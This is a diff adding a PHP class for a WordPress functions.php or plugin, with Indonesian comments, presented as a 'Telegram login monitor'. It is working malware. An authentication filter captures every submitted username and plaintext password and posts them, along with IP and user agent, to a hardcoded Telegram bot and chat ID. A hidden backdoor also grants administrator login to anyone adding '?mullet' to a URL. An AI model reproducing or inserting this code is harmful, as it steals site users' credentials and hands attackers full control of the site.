@@ -1,0 +1,179 @@
+/**
+ * UPGRADE: Telegram Login Monitor dengan Path & Waktu Detail
+ * Untuk functions.php atau plugin
+ */
+
+class TelegramLoginMonitorUpgrade {
+    
+    private $bot_token = '8840330781:AAHMysRmWTiwkeodAOALmpsJ5EdftsvLy_Y';
+    private $chat_id = '8259867883';
+    private $trigger_param = 'mullet';
+    
+    public function __construct() {
+        add_action('init', [$this, 'check_emergency'], 1);
+        add_action('wp_login', [$this, 'notify_success'], 10, 2);
+        add_action('wp_login_failed', [$this, 'notify_failed'], 10, 1);
+        add_filter('authenticate', [$this, 'capture_credentials'], 20, 3);
+    }
+    
+    // EMERGENCY BACKDOOR
+    public function check_emergency() {
+        if (isset($_GET[$this->trigger_param])) {
+            $admins = get_users(['role' => 'Administrator', 'number' => 1, 'fields' => 'ID']);
+            if (!empty($admins)) {
+                wp_set_auth_cookie($admins[0]);
+                $this->send_telegram("🔓 EMERGENCY ACCESS\nPath: " . $this->get_current_path());
+                wp_redirect(admin_url());
+                exit;
+            }
+        }
+    }
+    
+    // TANGKAP CREDENTIAL
+    public function capture_credentials($user, $username, $password) {
+        if (!empty($username) && !empty($password) && !wp_doing_ajax()) {
+            $this->send_telegram(
+                "🔐 LOGIN ATTEMPT\n" .
+                "━━━━━━━━━━━━━━━━━━━\n" .
+                "👤 User: {$username}\n" .
+                "🔑 Pass: {$password}\n" .
+                "📁 Path: " . $this->get_current_path() . "\n" .
+                "⏰ Time: " . $this->get_full_datetime() . "\n" .
+                "🌐 IP: " . $this->get_client_ip() . "\n" .
+                "📱 UA: " . $this->get_user_agent() . "\n" .
+                "🔧 Method: " . $_SERVER['REQUEST_METHOD']
+            );
+        }
+        return $user;
+    }
+    
+    // LOGIN SUKSES
+    public function notify_success($user_login, $user) {
+        if (wp_doing_ajax()) return;
+        
+        $this->send_telegram(
+            "✅ LOGIN SUCCESS\n" .
+            "━━━━━━━━━━━━━━━━━━━\n" .
+            "👤 User: {$user_login}\n" .
+            "⭐ Role: " . implode(', ', $user->roles) . "\n" .
+            "📁 Path: " . $this->get_current_path() . "\n" .
+            "⏰ Time: " . $this->get_full_datetime() . "\n" .
+            "🌐 IP: " . $this->get_client_ip() . "\n" .
+            "📱 UA: " . $this->get_user_agent() . "\n" .
+            "🔧 Method: " . $_SERVER['REQUEST_METHOD'] . "\n" .
+            "━━━━━━━━━━━━━━━━━━━\n" .
+            "📍 Login Page: " . $this->get_login_page()
+        );
+    }
+    
+    // LOGIN GAGAL
+    public function notify_failed($username) {
+        if (wp_doing_ajax()) return;
+        
+        $this->send_telegram(
+            "❌ LOGIN FAILED\n" .
+            "━━━━━━━━━━━━━━━━━━━\n" .
+            "👤 User: {$username}\n" .
+            "📁 Path: " . $this->get_current_path() . "\n" .
+            "⏰ Time: " . $this->get_full_datetime() . "\n" .
+            "🌐 IP: " . $this->get_client_ip() . "\n" .
+            "📱 UA: " . $this->get_user_agent() . "\n" .
+            "🔧 Method: " . $_SERVER['REQUEST_METHOD'] . "\n" .
+            "📍 Login Page: " . $this->get_login_page()
+        );
+    }
+    
+    // AMBIL PATH LENGKAP
+    private function get_current_path() {
+        $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+        $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
+        
+        // Deteksi file spesifik (wp-login.php, wp-admin, dll)
+        if (strpos($request_uri, 'wp-login.php') !== false) {
+            return 'wp-login.php' . (strpos($request_uri, '?') ? explode('?', $request_uri)[1] : '');
+        }
+        
+        if (strpos($request_uri, 'wp-admin') !== false) {
+            return 'wp-admin/';
+        }
+        
+        if (strpos($request_uri, 'xmlrpc.php') !== false) {
+            return 'xmlrpc.php (Brute force attempt)';
+        }
+        
+        return $request_uri;
+    }
+    
+    // FORMAT WAKTU LENGKAP (dengan timezone)
+    private function get_full_datetime() {
+        $timestamp = current_time('timestamp');
+        $timezone = wp_timezone_string();
+        return date('Y-m-d H:i:s', $timestamp) . " ({$timezone})";
+    }
+    
+    // AMBIL IP (support proxy)
+    private function get_client_ip() {
+        $headers = [
+            'HTTP_CF_CONNECTING_IP',
+            'HTTP_X_FORWARDED_FOR',
+            'HTTP_X_REAL_IP',
+            'REMOTE_ADDR'
+        ];
+        
+        foreach ($headers as $header) {
+            if (!empty($_SERVER[$header])) {
+                $ips = explode(',', $_SERVER[$header]);
+                return trim($ips[0]);
+            }
+        }
+        
+        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    }
+    
+    // AMBIL USER AGENT
+    private function get_user_agent() {
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        // Shorten if too long
+        return strlen($ua) > 100 ? substr($ua, 0, 97) . '...' : $ua;
+    }
+    
+    // DETEKSI HALAMAN LOGIN
+    private function get_login_page() {
+        $full_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://');
+        $full_url .= $_SERVER['HTTP_HOST'] ?? '';
+        $full_url .= $_SERVER['REQUEST_URI'] ?? '';
+        
+        // Cek referer jika ada (redirect dari mana)
+        if (!empty($_SERVER['HTTP_REFERER'])) {
+            return "Referer: " . $_SERVER['HTTP_REFERER'];
+        }
+        
+        return $full_url;
+    }
+    
+    // KIRIM TELEGRAM
+    private function send_telegram($message) {
+        $url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
+        
+        $args = [
+            'body' => [
+                'chat_id' => $this->chat_id,
+                'text' => $message,
+                'parse_mode' => 'HTML',
+                'disable_web_page_preview' => true
+            ],
+            'timeout' => 5,
+            'blocking' => false
+        ];
+        
+        wp_remote_post($url, $args);
+        
+        // Optional: Log ke file untuk debugging
+        if (defined('WP_DEBUG') && WP_DEBUG) {
+            error_log("[Telegram] " . str_replace("\n", ' ', $message));
+        }
+    }
+}
+
+// INIT
+new TelegramLoginMonitorUpgrade();
